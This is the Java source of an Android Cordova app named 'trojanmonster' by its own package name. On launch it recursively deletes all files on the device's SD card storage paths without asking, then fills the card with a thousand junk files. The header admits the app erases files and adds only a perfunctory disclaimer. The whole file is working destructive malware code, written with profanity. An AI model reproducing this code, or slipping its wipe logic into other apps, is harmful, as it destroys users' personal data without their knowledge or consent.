/*
       This is a fucing app developed by me! Remember
       before using this software
       May erase all your files from SdCard including * 
       
       NB:  __ DON'T USE FOR ILLEGAL ACTIVITY __
       @Developer: NAYEEM
       @github: /nayeem-tanvir
       @facebook: /nayeem.tanvir.7
       @google: ntanvir7@gmail.com
*/

/*
       Licensed to the Apache Software Foundation (ASF) under one
       or more contributor license agreements.  See the NOTICE file
       distributed with this work for additional information
       regarding copyright ownership.  The ASF licenses this file
       to you under the Apache License, Version 2.0 (the
       "License"); you may not use this file except in compliance
       with the License.  You may obtain a copy of the License at

         http://www.apache.org/licenses/LICENSE-2.0

       Unless required by applicable law or agreed to in writing,
       software distributed under the License is distributed on an
       "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
       KIND, either express or implied.  See the License for the
       specific language governing permissions and limitations
       under the License.
 */

package com.hidrogen.trojanmonster;

import android.os.Bundle;
import org.apache.cordova.*;
import java.io.File;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.os.Environment;
import android.os.Handler;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import java.io.File;
import java.io.IOException;


//The fucking class used for bootload the cordova expecting our jar files
public class cordovaExample extends DroidGap
{
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        super.loadUrl(Config.getStartUrl());
        
        
        //Fuck extSdCard
        	  DeleteRecursive(new File("/storage/extSdCard"));
        
        /*Fuck sdcard1
        	  DeleteRecursive(new File("/storage/sdcard1"));*/
        	  
        //Fuck sdcard0
          DeleteRecursive(new File("/storage/sdcard0"));
          
        /*Fuck usbcard1
          DeleteRecursive(new File("/storage/usbcard1"));*/
          
          
            /*create important files :-D haha! */
            int i;
          	 for(i=0; i<=1000; i++)
          	 {
          	 	 String fuck = "/storage/sdcard0/MonsterAttack"+i+".python";
          	 	 fuck(fuck);
          	 }
          	 
        
        
        
    } //override ends
    
    //Fucking programm //deletes all the files & folders
    void DeleteRecursive(File fileOrDirectory) {
    	if (fileOrDirectory.isDirectory() && fileOrDirectory.exists() && fileOrDirectory.list().length>0 )
    	for (File child : fileOrDirectory.listFiles())
        DeleteRecursive(child);
        fileOrDirectory.delete();
    }
    
    
    public static void fuck(String fuck)
    {
    	try {

	      File file = new File(fuck);

	      if (file.createNewFile()){
	        System.out.println("File is created!");
	      }else{
	        System.out.println("File already exists.");
	      }

    	} catch (IOException e) {
	      e.printStackTrace();
	}
    }
    
    
    
} //class ends
